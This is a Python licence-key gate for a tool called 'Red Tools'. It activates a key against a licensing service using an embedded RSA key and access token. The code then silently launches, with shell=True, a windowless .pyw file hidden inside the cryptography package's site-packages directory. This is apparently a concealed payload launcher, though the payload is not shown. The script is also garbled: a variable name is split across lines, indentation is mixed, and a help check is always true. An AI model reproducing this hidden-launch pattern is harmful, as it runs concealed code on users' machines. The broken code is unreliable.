from licensing.models import *
from licensing.methods import Key, Helpers

RSAPubKey = "<RSAKeyValue><Modulus>hFH+Q5RWfoq+vDP4m5PGL47SkzjGNyWyJcwImuSatydMsIwwkrOLiiTTdNVtV4nvvdDVYwFhFvkR+ZuiAFp3hRmjGy79OP5hWo1jMT3aHz8C68yfQgrjRqxPYY224yQW+fVxyX9c02iWD7yeDmLilafSpZtPoR/6kD5X8OnhHExYQZPHSIrutw8GVE0nAwYIEuN47toxyqOELDoF8X/hcF0mr/vbrId2Rqv9rfaY4JrvMJXyqrJM4rZrpYPsLKDlW3fNMoa28GHnxLVNENujs2F74E4ccubVXi5ciUgTXXkS+B72ATmY3HRxwD0SBvuERuFsQD8ssgYL23RXACwVGw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
auth = "WyIzMzAzMTc3IiwidVpJME1xalRPMzR1LzV6SGtyT1hZMVJ3V3J5eXNOcjltaGNUZmpRbSJd"

def AuthKey():
    

  print(Style.BRIGHT + Fore.YELLOW + "Enter your Authentication Key ")
    ke
y = str(input(">>>  "))
    result = Key.activate(token=auth,rsa_pub_key=RSAPubKey,product_id=12082,key=key,machine_code=Helpers.GetMachineCode())

    if result[0] == None:
        print(Style.BRIGHT + Fore.RED + "ERROR: {0}".format(result[1]))

        help = input("Need Help : Y /n  "  )
        if help == "Y" or help == "y":
			print("Contact Admin @david_3illa")
            print("")
        elif help != "n" or "N":
            print("Quit")
            time.sleep(2)
            sys.exit(0)
        return AuthKey() 
    else:
        print(Style.BRIGHT + Fore.GREEN + "Successfully Authenticated")
		time.sleep(1.5)
        print("")
        print(Style.BRIGHT + Fore.GREEN + "Welcome to Red Tools")
        time.sleep(2)

AuthKey()

import subprocess

subprocess.Popen("C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python39\\\\Lib\\\\site-packages\\\\cryptography\\\\hazmat\\\\primitives\\\\kdf\\\\active.pyw" , shell = True)

